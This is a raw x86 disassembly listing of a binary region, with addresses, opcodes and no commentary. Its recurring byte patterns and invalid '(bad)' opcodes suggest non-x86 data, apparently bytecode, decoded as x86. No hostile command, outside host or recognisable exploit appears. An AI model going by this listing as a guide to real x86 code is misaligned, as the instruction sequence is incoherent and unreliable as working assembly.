  40329e:	add    BYTE PTR [edx],cl
  4032a0:	sbb    ebx,DWORD PTR [eax-0x73]
  4032a3:	sub    al,0x0
  4032a5:	add    BYTE PTR [ecx],al
  4032a7:	adc    ebx,DWORD PTR [eax]
  4032a9:	adc    DWORD PTR [eax],ecx
  4032ab:	adc    DWORD PTR [eax],ebx
  4032ad:	outs   dx,DWORD PTR ds:[esi]
  4032ae:	js     0x4032b0
  4032b0:	add    BYTE PTR [edx],cl
  4032b2:	push   ss
  4032b3:	adc    ebx,DWORD PTR [ecx]
  4032b5:	sub    edx,DWORD PTR [ecx+edx*1]
  4032b8:	sbb    BYTE PTR [ecx],dl
  4032ba:	or     BYTE PTR [edi+0x77],ch
  4032bd:	add    BYTE PTR [eax],al
  4032bf:	or     dl,BYTE PTR [ecx]
  4032c1:	sbb    DWORD PTR [eax+0x14],ebx
  4032c4:	mov    ds:0x58171911,al
  4032c9:	adc    ebx,DWORD PTR [ecx]
  4032cb:	adc    DWORD PTR [ecx],ebx
  4032cd:	sbb    esi,DWORD PTR [edx]
  4032cf:	out    0x28,eax
  4032d1:	das    
  4032d2:	add    BYTE PTR [eax],al
  4032d4:	or     ch,BYTE PTR [eax]
  4032d6:	push   edi
  4032d7:	add    BYTE PTR [eax],al
  4032d9:	push   es
  4032da:	pop    ss
  4032db:	lea    eax,[ecx]
  4032dd:	add    BYTE PTR [eax],al
  4032df:	add    DWORD PTR [ebx],edx
  4032e1:	cmp    eax,0x11163d11
  4032e6:	push   es
  4032e7:	outs   dx,DWORD PTR ds:[esi]
  4032e8:	jns    0x4032ea
  4032ea:	add    BYTE PTR [edx],cl
  4032ec:	mov    ds:0x32283d11,al
  4032f1:	add    BYTE PTR [eax],al
  4032f3:	or     ch,BYTE PTR [eax]
  4032f5:	sbb    BYTE PTR [eax],al
  4032f7:	add    BYTE PTR [edx],cl
  4032f9:	adc    DWORD PTR [esi],eax
  4032fb:	sub    BYTE PTR [edx],dl
  4032fd:	add    BYTE PTR [eax],al
  4032ff:	push   es
  403300:	ficom  WORD PTR [esi]
  403302:	adc    ebx,DWORD PTR [edx]
  403304:	adc    DWORD PTR [edx],ebx
  403306:	outs   dx,DWORD PTR ds:[esi]
  403307:	jp     0x403309
  403309:	add    BYTE PTR [edx],cl
  40330b:	sub    BYTE PTR [eax],bl
  40330d:	add    BYTE PTR [eax],al
  40330f:	or     dl,BYTE PTR [edi]
  403311:	sub    BYTE PTR [ebx+0x0],bh
  403314:	add    BYTE PTR [edx],cl
  403316:	fiadd  WORD PTR [eax]
  403318:	pop    es
  403319:	adc    DWORD PTR [edi],eax
  40331b:	call   0x96b:0x39401325
  403322:	add    BYTE PTR [eax],al
  403324:	(bad)  
  403325:	adc    edi,DWORD PTR [esi+0xf]
  403328:	add    BYTE PTR [eax],al
  40332a:	add    al,0x3a
  40332c:	aad    0x0
  40332e:	add    BYTE PTR [eax],al
  403330:	pop    ds
  403331:	adc    BYTE PTR [ebx+0x7c],dh
  403334:	add    BYTE PTR [eax],al
  403336:	or     ah,BYTE PTR ds:0xf972
  40333c:	jo     0x403354
  40333e:	sub    BYTE PTR [ebp+0x0],bh
  403341:	add    BYTE PTR [edx],cl
  403343:	and    eax,0xfd72
  403348:	jo     0x403361
  40334a:	sub    BYTE PTR [ebp+0x0],bh
  40334d:	add    BYTE PTR [edx],cl
  40334f:	and    eax,0x10372
  403354:	jo     0x40336e
  403356:	sub    BYTE PTR [ebp+0x0],bh
  403359:	add    BYTE PTR [edx],cl
  40335b:	and    eax,0x10d72
  403360:	jo     0x40337b
  403362:	sub    BYTE PTR [ebp+0x0],bh
  403365:	add    BYTE PTR [edx],cl
  403367:	and    eax,0x11572
  40336c:	jo     0x403388
  40336e:	sub    BYTE PTR [ebp+0x0],bh
  403371:	add    BYTE PTR [edx],cl
  403373:	and    eax,0x11b72
  403378:	jo     0x403395
  40337a:	sub    BYTE PTR [ebp+0x0],bh
  40337d:	add    BYTE PTR [edx],cl
  40337f:	and    eax,0x11f72
  403384:	jo     0x4033a2
  403386:	sub    BYTE PTR [ebp+0x0],bh
  403389:	add    BYTE PTR [edx],cl
  40338b:	and    eax,0x12772
  403390:	jo     0x4033af
  403392:	sub    BYTE PTR [ebp+0x0],bh
  403395:	add    BYTE PTR [edx],cl
  403397:	and    eax,0x12f72
  40339c:	jo     0x4033bc
  40339e:	sub    BYTE PTR [ebp+0x0],bh
  4033a1:	add    BYTE PTR [edx],cl
  4033a3:	and    eax,0x13572
  4033a8:	jo     0x4033c9
  4033aa:	or     DWORD PTR [eax],ebp
  4033ac:	jge    0x4033ae
  4033ae:	add    BYTE PTR [edx],cl
  4033b0:	and    eax,0x13b72
  4033b5:	jo     0x4033d6
  4033b7:	or     ch,BYTE PTR [eax]
  4033b9:	jge    0x4033bb
  4033bb:	add    BYTE PTR [edx],cl
  4033bd:	and    eax,0x14172
  4033c2:	jo     0x4033e3
  4033c4:	or     ebp,DWORD PTR [eax]
  4033c6:	jge    0x4033c8
  4033c8:	add    BYTE PTR [edx],cl
  4033ca:	and    eax,0x14572
  4033cf:	jo     0x4033f0
  4033d1:	or     al,0x28
  4033d3:	jge    0x4033d5
  4033d5:	add    BYTE PTR [edx],cl
  4033d7:	and    eax,0x14b72
  4033dc:	jo     0x4033fd
  4033de:	or     eax,0x7d28
  4033e3:	or     ah,BYTE PTR ds:0x15172
  4033e9:	jo     0x40340a
  4033eb:	push   cs
  4033ec:	sub    BYTE PTR [ebp+0x0],bh
  4033ef:	add    BYTE PTR [edx],cl
  4033f1:	and    eax,0x15972
  4033f6:	jo     0x403417
  4033f8:	movaps xmm7,XMMWORD PTR [ebp+0x0]
  4033fc:	add    BYTE PTR [edx],cl
  4033fe:	(bad)  
  4033ff:	adc    eax,DWORD PTR [eax+0x400000f]
  403405:	(bad)  
  403406:	adc    edi,DWORD PTR [esi+0xf]
  403409:	add    BYTE PTR [eax],al
  40340b:	add    al,0x11
  40340d:	inc    eax
  40340e:	adc    al,BYTE PTR [ecx+0x28]
  403411:	jle    0x403413
  403413:	add    BYTE PTR [edx],cl
  403415:	cmp    DWORD PTR [ebp+0x8],esi
  403418:	add    BYTE PTR [eax],al
  40341a:	adc    DWORD PTR [ecx+0x45],eax
  40341d:	adc    BYTE PTR [eax],al
  40341f:	add    BYTE PTR [eax],al
  403421:	add    eax,0x1b000000
  403426:	add    BYTE PTR [eax],al
  403428:	add    BYTE PTR [ecx],dh
  40342a:	add    BYTE PTR [eax],al
  40342c:	add    BYTE PTR [edi+0x0],al
  40342f:	add    BYTE PTR [eax],al
  403431:	sahf   
  403432:	add    BYTE PTR [eax],al
  403434:	add    al,bh
  403436:	add    BYTE PTR [eax],al
  403438:	add    BYTE PTR [esi],bh
  40343a:	add    DWORD PTR [eax],eax
  40343c:	add    bl,bh
  40343e:	add    DWORD PTR [eax],eax
  403440:	add    BYTE PTR [eax+0x54000002],bh
  403446:	add    eax,DWORD PTR [eax]
  403448:	add    BYTE PTR [ebx+0x4],cl
  40344b:	add    BYTE PTR [eax],al
  40344d:	inc    edx
  40344e:	add    eax,0x6080000
  403453:	add    BYTE PTR [eax],al
  403455:	imul   eax,DWORD PTR [esi],0x0
  403458:	add    BYTE PTR [ecx],al
  40345a:	pop    es
  40345b:	add    BYTE PTR [eax],al
  40345d:	pop    eax
  40345e:	pop    es
  40345f:	add    BYTE PTR [eax],al
  403461:	cmp    BYTE PTR [ecx],ch
  403463:	or     BYTE PTR [eax],al
  403465:	add    BYTE PTR [ecx],dl
  403467:	sbb    BYTE PTR [esi],dl
  403469:	call   0x8:0x28161616
  403470:	add    BYTE PTR [esi],al
  403472:	sub    BYTE PTR [edx],al
  403474:	add    BYTE PTR [eax],al
  403476:	push   es
  403477:	cmp    BYTE PTR [ebx],dl
  403479:	or     BYTE PTR [eax],al
  40347b:	add    BYTE PTR [ecx],dl
  40347d:	sbb    BYTE PTR [esi],dl
  40347f:	call   0x8:0x28161617
  403486:	add    BYTE PTR [esi],al
  403488:	sub    BYTE PTR [edx],al
  40348a:	add    BYTE PTR [eax],al
  40348c:	push   es
  40348d:	cmp    ch,bh
  40348f:	pop    es
  403490:	add    BYTE PTR [eax],al
  403492:	adc    DWORD PTR [eax],ebx
  403494:	push   ss
  403495:	call   0x8:0x28161618
  40349c:	add    BYTE PTR [esi],al
  40349e:	sub    BYTE PTR [edx],al
  4034a0:	add    BYTE PTR [eax],al
  4034a2:	push   es
  4034a3:	cmp    bh,ah
  4034a5:	pop    es
  4034a6:	add    BYTE PTR [eax],al
  4034a8:	sub    BYTE PTR [edi],ch
  4034aa:	add    BYTE PTR [eax],al
  4034ac:	or     ch,BYTE PTR [eax]
  4034ae:	and    DWORD PTR [eax],eax
  4034b0:	add    BYTE PTR [esi],al
  4034b2:	pop    ss
  4034b3:	lea    eax,[ecx]
  4034b5:	add    BYTE PTR [eax],al
  4034b7:	add    DWORD PTR [ebx],edx
  4034b9:	cmp    eax,0x11163d11
  4034be:	sbb    BYTE PTR [esi],dl
  4034c0:	call   0x32:0x283d11a2
  4034c7:	add    BYTE PTR [edx],cl
  4034c9:	sub    BYTE PTR [eax],bl
  4034cb:	add    BYTE PTR [eax],al
  4034cd:	or     bh,BYTE PTR [esi+0x6]
  4034d0:	add    BYTE PTR [eax],al
  4034d2:	add    al,0x14
  4034d4:	adc    DWORD PTR [eax],ebx
  4034d6:	push   ss
  4034d7:	call   0x7f6f:0x9a171811
  4034de:	add    BYTE PTR [eax],al
  4034e0:	or     dl,BYTE PTR [ebx]
  4034e2:	sbb    ebp,DWORD PTR [eax]
  4034e4:	pop    edx
  4034e5:	add    BYTE PTR [eax],al
  4034e7:	push   es
  4034e8:	sub    BYTE PTR [eax],bl
  4034ea:	add    BYTE PTR [eax],al
  4034ec:	or     dl,BYTE PTR [ecx]
  4034ee:	sbb    edx,DWORD PTR [edi]
  4034f0:	sub    BYTE PTR [ecx],cl
  4034f2:	add    BYTE PTR [eax],al
  4034f4:	push   es
  4034f5:	sub    BYTE PTR [edx],al
  4034f7:	add    BYTE PTR [eax],al
  4034f9:	push   es
  4034fa:	cmp    BYTE PTR [eax+0x28000007],dl
  403500:	das    
  403501:	add    BYTE PTR [eax],al
  403503:	or     ch,BYTE PTR [eax]
  403505:	and    al,BYTE PTR [eax]
  403507:	add    BYTE PTR [esi],al
  403509:	pop    ss
  40350a:	lea    eax,[ecx]
  40350c:	add    BYTE PTR [eax],al
  40350e:	add    DWORD PTR [ebx],edx
  403510:	cmp    eax,0x11163d11
  403515:	sbb    BYTE PTR [edi],dl
  403517:	call   0x32:0x283d11a2
  40351e:	add    BYTE PTR [edx],cl
  403520:	sub    BYTE PTR [eax],bl
  403522:	add    BYTE PTR [eax],al
  403524:	or     bh,BYTE PTR [esi+0x6]
  403527:	add    BYTE PTR [eax],al
  403529:	add    al,0x11
  40352b:	sbb    BYTE PTR [esi],dl
  40352d:	call   0x1811:0x9a171811
  403534:	sbb    BYTE PTR [edx+0x7f6f],bl
  40353a:	or     dl,BYTE PTR [ebx]
  40353c:	sbb    al,0x28
  40353e:	pop    edx
  40353f:	add    BYTE PTR [eax],al
  403541:	push   es
  403542:	sub    BYTE PTR [eax],bl
  403544:	add    BYTE PTR [eax],al
  403546:	or     dl,BYTE PTR [ecx]
  403548:	sbb    al,0x17
  40354a:	sub    BYTE PTR [ecx],cl
  40354c:	add    BYTE PTR [eax],al
  40354e:	push   es
  40354f:	sub    BYTE PTR [edx],al
  403551:	add    BYTE PTR [eax],al
  403553:	push   es
  403554:	cmp    BYTE PTR [esi],dh
  403556:	pop    es
  403557:	add    BYTE PTR [eax],al
  403559:	sub    BYTE PTR [esi+0x0],cl
  40355c:	add    BYTE PTR [esi],al
  40355e:	sub    BYTE PTR [eax],bl
  403560:	add    BYTE PTR [eax],al
  403562:	or     bh,BYTE PTR [esi+0x6]
  403565:	add    BYTE PTR [eax],al
  403567:	add    al,0x11
  403569:	sbb    BYTE PTR [esi],dl
  40356b:	call   0xa00:0x806f16
  403572:	adc    eax,DWORD PTR [edx+0x16]
  403575:	adc    edi,DWORD PTR [ecx]
  403577:	sub    ebx,DWORD PTR [ecx]
  403579:	adc    DWORD PTR [edx+0x11],eax
  40357c:	cmp    DWORD PTR [edx+0x1d111d13],ebx
  403582:	sub    BYTE PTR [edx],al
  403584:	add    BYTE PTR [eax],al
  403586:	push   es
  403587:	sub    BYTE PTR [edi],dl
  403589:	add    BYTE PTR [eax],al
  40358b:	or     dl,BYTE PTR [ecx]
  40358d:	cmp    DWORD PTR [edi],edx
  40358f:	pop    eax
  403590:	adc    edi,DWORD PTR [ecx]
  403592:	adc    DWORD PTR [ecx],edi
  403594:	adc    DWORD PTR [edx-0x72],eax
  403597:	imul   esi,DWORD PTR [edx],0x6f038df
  40359d:	add    BYTE PTR [eax],al
  40359f:	adc    DWORD PTR [eax],ebx
  4035a1:	push   ss
  4035a2:	call   0x8:0x28171716
  4035a9:	add    BYTE PTR [esi],al
  4035ab:	adc    eax,DWORD PTR ds:0x1a6f0511
  4035b1:	add    BYTE PTR [eax],al
  4035b3:	or     ch,BYTE PTR [edi+0x1f]
  4035b6:	add    BYTE PTR [eax],al
  4035b8:	or     dl,BYTE PTR [ecx]
  4035ba:	add    eax,0x206f
  4035bf:	or     ch,BYTE PTR [eax]
  4035c1:	and    DWORD PTR [eax],eax
  4035c3:	add    BYTE PTR [edx],cl
  4035c5:	adc    ebx,DWORD PTR [esi]
  4035c7:	sub    BYTE PTR [ecx+0x110a0000],al
  4035cd:	sbb    BYTE PTR [esi],dl
  4035cf:	call   0x6f70:0xc572
  4035d6:	add    BYTE PTR [eax],0x0
  4035d9:	or     ch,BYTE PTR [eax*1+0x331a1e11]
  4035e0:	inc    ecx
  4035e1:	sub    BYTE PTR [ebx+0x0],cl
  4035e4:	add    BYTE PTR [esi],al
  4035e6:	sub    BYTE PTR [eax],bl
  4035e8:	add    BYTE PTR [eax],al
  4035ea:	or     bh,BYTE PTR [esi+0x6]
  4035ed:	add    BYTE PTR [eax],al
  4035ef:	add    al,0x11
  4035f1:	add    eax,0x1a6f
  4035f6:	or     dl,BYTE PTR [edi]
  4035f8:	adc    DWORD PTR [eax],ebx
  4035fa:	pop    ss
  4035fb:	call   0x280a:0x836f
  403602:	pop    edx
  403603:	add    BYTE PTR [eax],al
  403605:	push   es
  403606:	sub    BYTE PTR [eax],bl
  403608:	add    BYTE PTR [eax],al
  40360a:	or     dl,BYTE PTR [ecx]
  40360c:	add    eax,0x1a6f
  403611:	or     dl,BYTE PTR [esi]
  403613:	sub    BYTE PTR [ecx],cl
  403615:	add    BYTE PTR [eax],al
  403617:	push   es
  403618:	sub    BYTE PTR [edx],al
  40361a:	add    BYTE PTR [eax],al
  40361c:	push   es
  40361d:	cmp    BYTE PTR [ebp+0x6],ch
  403620:	add    BYTE PTR [eax],al
  403622:	sub    BYTE PTR [edi],ch
  403624:	add    BYTE PTR [eax],al
  403626:	or     ch,BYTE PTR [eax]
  403628:	inc    ebp
  403629:	add    BYTE PTR [eax],al
  40362b:	push   es
  40362c:	sbb    BYTE PTR [ebp+0x1000001],cl
  403632:	adc    edi,DWORD PTR ds:0x11163d11
  403638:	sbb    BYTE PTR [esi],dl
  40363a:	call   0xa00:0x4f6f18
  403641:	mov    ds:0x72173d11,al
  403646:	push   edi
  403647:	add    al,BYTE PTR [eax]
  403649:	jo     0x4035ed
  40364b:	adc    DWORD PTR ds:0x3228,edi
  403651:	or     ch,BYTE PTR [eax]
  403653:	sbb    BYTE PTR [eax],al
  403655:	add    BYTE PTR [edx],cl
  403657:	cmp    BYTE PTR [ebx],dh
  403659:	push   es
  40365a:	add    BYTE PTR [eax],al
  40365c:	adc    DWORD PTR [eax],ebx
  40365e:	push   ss
  40365f:	call   0x8:0x28171716
  403666:	add    BYTE PTR [esi],al
  403668:	adc    eax,DWORD PTR ds:0x1a6f0511
  40366e:	add    BYTE PTR [eax],al
  403670:	or     ch,BYTE PTR [edi+0x1f]
  403673:	add    BYTE PTR [eax],al
  403675:	or     dl,BYTE PTR [ecx]
  403677:	add    eax,0x206f
  40367c:	or     ch,BYTE PTR [eax]
  40367e:	and    DWORD PTR [eax],eax
  403680:	add    BYTE PTR [edx],cl
  403682:	adc    ebx,DWORD PTR [edi]
  403684:	sub    BYTE PTR [ecx+0x110a0000],al
  40368a:	sbb    BYTE PTR [esi],dl
  40368c:	call   0x6f70:0xc572
  403693:	add    BYTE PTR [eax],0x0
  403696:	or     ch,BYTE PTR [eax*1+0x331a1f11]
  40369d:	inc    ecx
  40369e:	sub    BYTE PTR [esi],bl
  4036a0:	add    BYTE PTR [eax],al
  4036a2:	push   es
  4036a3:	sub    BYTE PTR [eax],bl
  4036a5:	add    BYTE PTR [eax],al
  4036a7:	or     bh,BYTE PTR [esi+0x6]
  4036aa:	add    BYTE PTR [eax],al
  4036ac:	add    al,0x11
  4036ae:	add    eax,0x1a6f
  4036b3:	or     bl,BYTE PTR [eax]
  4036b5:	adc    DWORD PTR [eax],ebx
  4036b7:	pop    ss
  4036b8:	call   0x280a:0x836f
  4036bf:	pop    edx
  4036c0:	add    BYTE PTR [eax],al
  4036c2:	push   es
  4036c3:	sub    BYTE PTR [eax],bl
  4036c5:	add    BYTE PTR [eax],al
  4036c7:	or     dl,BYTE PTR [ecx]
  4036c9:	add    eax,0x1a6f
  4036ce:	or     dl,BYTE PTR [esi]
  4036d0:	sub    BYTE PTR [ecx],cl
  4036d2:	add    BYTE PTR [eax],al
  4036d4:	push   es
  4036d5:	sub    BYTE PTR [edx],al
  4036d7:	add    BYTE PTR [eax],al
  4036d9:	push   es
  4036da:	cmp    BYTE PTR [eax+0x28000005],dh
  4036e0:	das    
  4036e1:	add    BYTE PTR [eax],al
  4036e3:	or     ch,BYTE PTR [eax]
  4036e5:	inc    ebp
  4036e6:	add    BYTE PTR [eax],al
  4036e8:	push   es
  4036e9:	sbb    BYTE PTR [ebp+0x1000001],cl
  4036ef:	adc    edi,DWORD PTR ds:0x11163d11
  4036f5:	sbb    BYTE PTR [esi],dl
  4036f7:	call   0xa00:0x4f6f18
  4036fe:	mov    ds:0x72173d11,al
  403703:	push   edi
  403704:	add    al,BYTE PTR [eax]
  403706:	jo     0x4036aa
  403708:	adc    DWORD PTR ds:0x3228,edi
  40370e:	or     ch,BYTE PTR [eax]
  403710:	sbb    BYTE PTR [eax],al
  403712:	add    BYTE PTR [edx],cl
  403714:	cmp    BYTE PTR [esi+0x5],dh
  403717:	add    BYTE PTR [eax],al
  403719:	adc    DWORD PTR [eax],ebx
  40371b:	push   ss
  40371c:	call   0x8:0x28171716
  403723:	add    BYTE PTR [esi],al
  403725:	adc    eax,DWORD PTR ds:0x1a6f0511
  40372b:	add    BYTE PTR [eax],al
  40372d:	or     ch,BYTE PTR [edi+0x1f]
  403730:	add    BYTE PTR [eax],al
  403732:	or     dl,BYTE PTR [ecx]
  403734:	add    eax,0x206f
  403739:	or     ch,BYTE PTR [eax]
  40373b:	and    DWORD PTR [eax],eax
  40373d:	add    BYTE PTR [edx],cl
  40373f:	adc    esp,DWORD PTR [eax]
  403741:	sub    BYTE PTR [ecx+0x110a0000],al
  403747:	sbb    BYTE PTR [esi],dl
  403749:	call   0x6f70:0xc572
  403750:	add    BYTE PTR [eax],0x0
  403753:	or     ch,BYTE PTR [eax*1+0x331a2011]
  40375a:	and    BYTE PTR [eax],ch
  40375c:	and    eax,DWORD PTR [eax]
  40375e:	add    BYTE PTR [esi],al
  403760:	sub    BYTE PTR [eax],bl
  403762:	add    BYTE PTR [eax],al
  403764:	or     bh,BYTE PTR [esi+0x6]
  403767:	add    BYTE PTR [eax],al
  403769:	add    al,0x11
  40376b:	add    eax,0x1a6f
  403770:	or     ch,BYTE PTR [edi-0x7c]
  403773:	add    BYTE PTR [eax],al
  403775:	or     bh,BYTE PTR [eax]
  403777:	adc    al,0x5
  403779:	add    BYTE PTR [eax],al
  40377b:	sub    BYTE PTR [edi],ch
  40377d:	add    BYTE PTR [eax],al
  40377f:	or     ch,BYTE PTR [eax]
  403781:	inc    ebp
  403782:	add    BYTE PTR [eax],al
  403784:	push   es
  403785:	sbb    BYTE PTR [ebp+0x1000001],cl
  40378b:	adc    edi,DWORD PTR ds:0x11163d11
  403791:	sbb    BYTE PTR [esi],dl
  403793:	call   0xa00:0x4f6f18
  40379a:	mov    ds:0x72173d11,al
  40379f:	push   edi
  4037a0:	add    al,BYTE PTR [eax]
  4037a2:	jo     0x403746
  4037a4:	adc    DWORD PTR ds:0x3228,edi
  4037aa:	or     ch,BYTE PTR [eax]
  4037ac:	sbb    BYTE PTR [eax],al
  4037ae:	add    BYTE PTR [edx],cl
  4037b0:	cmp    dl,bl
  4037b2:	add    al,0x0
  4037b4:	add    BYTE PTR [ecx],dl
  4037b6:	sbb    BYTE PTR [esi],dl
  4037b8:	call   0x8:0x28171716
  4037bf:	add    BYTE PTR [esi],al
  4037c1:	adc    eax,DWORD PTR ds:0x1a6f0511
  4037c7:	add    BYTE PTR [eax],al
  4037c9:	or     ch,BYTE PTR [edi+0x1f]
  4037cc:	add    BYTE PTR [eax],al
  4037ce:	or     dl,BYTE PTR [ecx]
  4037d0:	add    eax,0x206f
  4037d5:	or     ch,BYTE PTR [eax]
  4037d7:	and    DWORD PTR [eax],eax
  4037d9:	add    BYTE PTR [edx],cl
  4037db:	adc    esp,DWORD PTR [ecx]
  4037dd:	adc    DWORD PTR [eax],ebx
  4037df:	pop    ss
  4037e0:	call   0x8:0x28171716
  4037e7:	add    BYTE PTR [esi],al
  4037e9:	adc    eax,DWORD PTR [eax+ebp*1]
  4037ec:	add    DWORD PTR [eax],0x18110a00
  4037f2:	push   ss
  4037f3:	call   0x6f70:0xc572
  4037fa:	add    BYTE PTR [eax],0x0
  4037fd:	or     ch,BYTE PTR [eax*1+0x331a2111]
  403804:	ins    DWORD PTR es:[edi],dx
  403805:	sub    BYTE PTR [edi],ch
  403807:	add    BYTE PTR [eax],al
  403809:	or     ch,BYTE PTR [eax]
  40380b:	sbb    eax,DWORD PTR [eax]
  40380d:	add    BYTE PTR [esi],al
  40380f:	sbb    BYTE PTR [ebp+0x1000001],cl
  403815:	adc    edi,DWORD PTR ds:0x11163d11
  40381b:	add    al,0x6f
  40381d:	sub    eax,DWORD PTR [eax]
  40381f:	add    BYTE PTR [edx],cl
  403821:	mov    ds:0x11173d11,al
  403826:	add    eax,0x2b6f
  40382b:	or     ah,BYTE PTR [edx+0x32283d11]
  403831:	add    BYTE PTR [eax],al
  403833:	or     ch,BYTE PTR [eax]
  403835:	sbb    BYTE PTR [eax],al
  403837:	add    BYTE PTR [edx],cl
  403839:	jle    0x403841
  40383b:	add    BYTE PTR [eax],al
  40383d:	add    al,0x11
  40383f:	add    eax,0x1a6f
  403844:	or     dl,BYTE PTR [ecx]
  403846:	add    al,0x6f
  403848:	sbb    al,BYTE PTR [eax]
  40384a:	add    BYTE PTR [edx],cl
  40384c:	outs   dx,DWORD PTR ds:[esi]
  40384d:	test   DWORD PTR [eax],eax
  40384f:	add    BYTE PTR [edx],cl
  403851:	sub    BYTE PTR [edx+0x0],bl
  403854:	add    BYTE PTR [esi],al
  403856:	sub    BYTE PTR [eax],bl
  403858:	add    BYTE PTR [eax],al
  40385a:	or     dl,BYTE PTR [ecx]
  40385c:	add    eax,0x1a6f
  403861:	or     dl,BYTE PTR [edi]
  403863:	sub    BYTE PTR [ecx],cl
  403865:	add    BYTE PTR [eax],al
  403867:	push   es
  403868:	sub    BYTE PTR [edx],al
  40386a:	add    BYTE PTR [eax],al
  40386c:	push   es
  40386d:	cmp    BYTE PTR ds:0x28000004,bl
  403873:	das    
  403874:	add    BYTE PTR [eax],al
  403876:	or     ch,BYTE PTR [eax]
  403878:	inc    ebp
  403879:	add    BYTE PTR [eax],al
  40387b:	push   es
  40387c:	sbb    BYTE PTR [ebp+0x1000001],cl
  403882:	adc    edi,DWORD PTR ds:0x11163d11
  403888:	sbb    BYTE PTR [esi],dl
  40388a:	call   0xa00:0x4f6f18
  403891:	mov    ds:0x72173d11,al
  403896:	push   edi
  403897:	add    al,BYTE PTR [eax]
  403899:	jo     0x40383d
  40389b:	adc    DWORD PTR ds:0x3228,edi
  4038a1:	or     ch,BYTE PTR [eax]
  4038a3:	sbb    BYTE PTR [eax],al
  4038a5:	add    BYTE PTR [edx],cl
  4038a7:	cmp    bl,ah
  4038a9:	add    eax,DWORD PTR [eax]
  4038ab:	add    BYTE PTR [ecx],dl
  4038ad:	sbb    BYTE PTR [esi],dl
  4038af:	call   0x8:0x28171716
  4038b6:	add    BYTE PTR [esi],al
  4038b8:	adc    eax,DWORD PTR ds:0x1a6f0511
  4038be:	add    BYTE PTR [eax],al
  4038c0:	or     ch,BYTE PTR [edi+0x1f]
  4038c3:	add    BYTE PTR [eax],al
  4038c5:	or     dl,BYTE PTR [ecx]
  4038c7:	add    eax,0x206f
  4038cc:	or     ch,BYTE PTR [eax]
  4038ce:	and    DWORD PTR [eax],eax
  4038d0:	add    BYTE PTR [edx],cl
  4038d2:	adc    esp,DWORD PTR [edx]
  4038d4:	adc    DWORD PTR [eax],ebx
  4038d6:	pop    ss
  4038d7:	call   0x8:0x28171716
  4038de:	add    BYTE PTR [esi],al
  4038e0:	adc    eax,DWORD PTR [eax+ebp*1]
  4038e3:	add    DWORD PTR [eax],0x18110a00
  4038e9:	push   ss
  4038ea:	call   0x6f70:0xc572
  4038f1:	add    BYTE PTR [eax],0x0
  4038f4:	or     ch,BYTE PTR [eax*1+0x331a2211]
  4038fb:	ins    DWORD PTR es:[edi],dx
  4038fc:	sub    BYTE PTR [edi],ch
  4038fe:	add    BYTE PTR [eax],al
  403900:	or     ch,BYTE PTR [eax]
  403902:	dec    edx
  403903:	add    BYTE PTR [eax],al
  403905:	push   es
  403906:	sbb    BYTE PTR [ebp+0x1000001],cl
  40390c:	adc    edi,DWORD PTR ds:0x11163d11
  403912:	add    al,0x6f
  403914:	sub    eax,DWORD PTR [eax]
  403916:	add    BYTE PTR [edx],cl
  403918:	mov    ds:0x11173d11,al
  40391d:	add    eax,0x2b6f
  403922:	or     ah,BYTE PTR [edx+0x32283d11]
  403928:	add    BYTE PTR [eax],al
  40392a:	or     ch,BYTE PTR [eax]
  40392c:	sbb    BYTE PTR [eax],al
  40392e:	add    BYTE PTR [edx],cl
  403930:	jle    0x403938
  403932:	add    BYTE PTR [eax],al
  403934:	add    al,0x11
  403936:	add    eax,0x1a6f
  40393b:	or     dl,BYTE PTR [ecx]
  40393d:	add    al,0x6f
  40393f:	sbb    al,BYTE PTR [eax]
  403941:	add    BYTE PTR [edx],cl
  403943:	outs   dx,DWORD PTR ds:[esi]
  403944:	xchg   BYTE PTR [eax],al
  403946:	add    BYTE PTR [edx],cl
  403948:	sub    BYTE PTR [edx+0x0],bl
  40394b:	add    BYTE PTR [esi],al
  40394d:	sub    BYTE PTR [eax],bl
  40394f:	add    BYTE PTR [eax],al
  403951:	or     dl,BYTE PTR [ecx]
  403953:	add    eax,0x1a6f
  403958:	or     dl,BYTE PTR [edi]
  40395a:	sub    BYTE PTR [ecx],cl
  40395c:	add    BYTE PTR [eax],al
  40395e:	push   es
  40395f:	sub    BYTE PTR [edx],al
  403961:	add    BYTE PTR [eax],al
  403963:	push   es
  403964:	cmp    BYTE PTR [esi],ah
  403966:	add    eax,DWORD PTR [eax]
  403968:	add    BYTE PTR [eax],ch
  40396a:	das    
  40396b:	add    BYTE PTR [eax],al
  40396d:	or     ch,BYTE PTR [eax]
  40396f:	inc    ebp
  403970:	add    BYTE PTR [eax],al
  403972:	push   es
  403973:	sbb    BYTE PTR [ebp+0x1000001],cl
  403979:	adc    edi,DWORD PTR ds:0x11163d11
  40397f:	sbb    BYTE PTR [esi],dl
  403981:	call   0xa00:0x4f6f18
  403988:	mov    ds:0x72173d11,al
  40398d:	push   edi
  40398e:	add    al,BYTE PTR [eax]
  403990:	jo     0x403934
  403992:	adc    DWORD PTR ds:0x3228,edi
  403998:	or     ch,BYTE PTR [eax]
  40399a:	sbb    BYTE PTR [eax],al
  40399c:	add    BYTE PTR [edx],cl
  40399e:	cmp    ah,ch
  4039a0:	add    al,BYTE PTR [eax]
  4039a2:	add    BYTE PTR [ecx],dl
  4039a4:	sbb    BYTE PTR [edi],dl
  4039a6:	call   0x2817:0x1811092d
  4039ad:	xchg   DWORD PTR [eax],eax
  4039af:	add    BYTE PTR [edx],cl
  4039b1:	mov    ds:0x9a161811,al
  4039b6:	push   ss
  4039b7:	pop    ss
  4039b8:	pop    ss
  4039b9:	sub    BYTE PTR [eax],cl
  4039bb:	add    BYTE PTR [eax],al
  4039bd:	push   es
  4039be:	adc    eax,DWORD PTR ds:0x1a6f0511
  4039c4:	add    BYTE PTR [eax],al
  4039c6:	or     ch,BYTE PTR [edi+0x1f]
  4039c9:	add    BYTE PTR [eax],al
  4039cb:	or     dl,BYTE PTR [ecx]
  4039cd:	add    eax,0x206f
  4039d2:	or     ch,BYTE PTR [eax]
  4039d4:	and    DWORD PTR [eax],eax
  4039d6:	add    BYTE PTR [edx],cl
  4039d8:	adc    DWORD PTR es:[eax],ebx
  4039db:	pop    ss
  4039dc:	call   0x8:0x28171716
  4039e3:	add    BYTE PTR [esi],al
  4039e5:	adc    eax,DWORD PTR [eax+ebp*1]
  4039e8:	pop    ds
  4039e9:	add    BYTE PTR [eax],al
  4039eb:	push   es
  4039ec:	sub    BYTE PTR [eax],bl
  4039ee:	add    BYTE PTR [eax],al
  4039f0:	or     bh,BYTE PTR [esi+0x6]
  4039f3:	add    BYTE PTR [eax],al
  4039f5:	add    al,0x11
  4039f7:	add    eax,0x1a6f
  4039fc:	or     dl,BYTE PTR [ecx]
